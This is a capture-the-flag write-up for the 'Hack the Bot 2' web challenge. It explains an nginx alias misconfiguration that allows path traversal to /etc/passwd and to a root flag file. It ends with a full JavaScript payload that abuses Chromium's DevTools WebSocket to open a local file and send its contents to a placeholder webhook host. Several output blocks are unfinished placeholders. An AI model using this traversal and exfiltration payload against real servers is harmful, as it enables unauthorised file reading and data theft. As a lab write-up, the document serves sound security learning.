---
title: "Hack the Bot 2"
description: "I've developed a little application to help me with my pentest missions, with lots of useful payloads! I even let users add new payloads, but since I was in a rush I didn't have time to test the security of my application, could you take care of it?"
pubDate: 2025-03-09
ctf: "PwnMe Quals 2025"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/25-pwnmequals/icon.png"
hidden: true
---

> Original Writeup on [seall.dev](https://seall.dev/posts/pwnmequals2025#hack-the-bot-2)

> This was a post-solve of the challenge!

This was a hard whitebox challenge, the files are available for download [here](https://github.com/sajjadium/ctf-archives/tree/64792ed55d90e43deb30cca2aa1f09e106a0eee3/ctfs/PwnMe/2025/Quals/web/Hack_the_bot_)

## Initial Look

The program is the same as the one described in the 'Initial Look' section of the [Hack the Bot 1](../25-pwnmequals-hackthebot1) writeup.

This time the flag is stored in a folder, you can see it being moved in the `Dockerfile`:
```docker
...
COPY flag2.txt /root/
...
```

### Nginx Misconfiguration

Looking at the `nginx` configuration file, there is an error:
```
events{}
user root;

http {
    server {
        listen 80;

        location / {
            proxy_pass http://127.0.0.1:5000;
        }

        location /logs {
            autoindex off;
            alias /tmp/bot_folder/logs/;
            try_files $uri $uri/ =404;
        }
    }
}
```

There are more details [here](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/) but here is a brief summary.

Nginx `alias` is a replacement for the path specified in `location`, for example:
```
location /i/ {
    alias /data/w3/images/;
}
```

If I sent a request to `/i/example.txt` it is getting the file from `/data/w3/images/example.txt`.

Our configuration has the following (with some lines removed for brevity):
```
location /logs {
    alias /tmp/bot_folder/logs/;
}
```

Due to the lack of the closing `/` on `/logs`, we can achieve path traversal.

If we sent the request `/logs../../../etc/passwd` it results in `/tmp/bot_folder/logs/../../../etc/passwd`.

After being traversed it resolves to `/etc/passwd`, and will return the contents of that file!

Let's test this with that payload on the webserver, with URI `http://localhost/logs../../../etc/passwd`:

```
INSERT DATA
```

We can just read the flag now! `http://localhost/logs../../../root/flag2.txt`:
```
NOT WORKING LOL
```

Oh, well that makes sense, we don't have permissions.

After a decent amount of poking around, we should have a look at the contents of `browser_cache` on the container to get an idea of what we are working with in terms of Chromium.

```
DATA AGAIN
```

### Final Payload

```js
(async () => {
  let res = await fetch('http://localhost/logs../browser_cache/DevToolsActivePort', {
    cache: 'no-cache'
  });
  let text = await res.text();
  console.log(text);
  const lines = text.trim().split('\n');
  const port = parseInt(lines[0].trim(), 10);
  let path = lines[1].trim();
  const wsUrl = `ws://localhost:${port}${path}`;
  let ws;
  const webhook = `https://WEBHOOK/`
  
  ws = new WebSocket(wsUrl);
  let targetId = null;
  
  ws.onopen = () => {
    const createTargetCommand = {
      id: 1,
      method: 'Target.createTarget',
      params: { url: "file:///root/flag2.txt" }
    };
    ws.send(JSON.stringify(createTargetCommand));
    fetch(`${webhook}?openedWS`);
  };
  
  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    fetch(`${webhook}?received=${btoa(event.data)}`);
    
    if (data && data.id === 1 && data.result && data.result.targetId) {
      targetId = data.result.targetId;
      fetch(`${webhook}?gotTargetId=${targetId}`);
      
      const attachCommand = {
        id: 2,
        method: 'Target.attachToTarget',
        params: { 
          targetId: targetId,
          flatten: true
        }
      };
      ws.send(JSON.stringify(attachCommand));
    }
    
    else if (data && data.id === 2 && data.result && data.result.sessionId) {
      const sessionId = data.result.sessionId;
      fetch(`${webhook}?gotSessionId=${sessionId}`);
      
      const enableRuntimeCommand = {
        id: 3,
        method: 'Runtime.enable',
        params: {},
        sessionId: sessionId
      };
      ws.send(JSON.stringify(enableRuntimeCommand));
      
      const evaluateCommand = {
        id: 4,
        method: 'Runtime.evaluate',
        params: {
          expression: 'document.documentElement.outerHTML',
          returnByValue: true
        },
        sessionId: sessionId
      };
      ws.send(JSON.stringify(evaluateCommand));
    }
    
    else if (data && data.id === 4 && data.result && data.result.result) {
      const pageContents = data.result.result.value;
      fetch(`${webhook}?contents=${btoa(pageContents)}`);
      
      const evaluateTextCommand = {
        id: 5,
        method: 'Runtime.evaluate',
        params: {
          expression: 'document.body.innerText || document.documentElement.textContent',
          returnByValue: true
        },
        sessionId: data.sessionId
      };
      ws.send(JSON.stringify(evaluateTextCommand));
    }
    
    else if (data && data.id === 5 && data.result && data.result.result) {
      const textContents = data.result.result.value;
      fetch(`${webhook}?plaintext=${btoa(textContents)}`);
    }
  };
  
  ws.onerror = (error) => {
    fetch(`${webhook}?error=${btoa(error.toString())}`);
  };
  
  ws.onclose = () => {
    fetch(`${webhook}?weclosed`);
  };
})();
```